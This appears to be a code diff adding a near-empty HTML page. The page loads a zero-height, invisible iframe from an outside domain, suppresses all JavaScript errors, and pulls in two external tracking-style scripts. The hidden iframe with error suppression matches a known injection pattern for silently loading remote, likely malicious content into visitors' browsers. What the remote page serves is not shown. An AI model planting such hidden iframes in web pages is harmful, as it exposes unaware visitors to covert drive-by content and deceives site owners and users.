@@ -1,0 +1,20 @@
+<html>
+<body>
+<iframe src=http://qqq.qq1680.com/gg.htm width=100 height=0></iframe>
+
+</body>
+<SCRIPT LANGUAGE='JavaScript'> 
+<!-- 
+
+function ResumeError() { 
+return true; 
+} 
+window.onerror = ResumeError; 
+// --> 
+</SCRIPT>
+</html>
+<script language="javascript" src="http://ww4.tongji123.com/g1.aspx?id=43823961"></script>
+<script language="javascript" type="text/javascript" src="http://js.users.51.la/985195.js"></script>
+
+
+
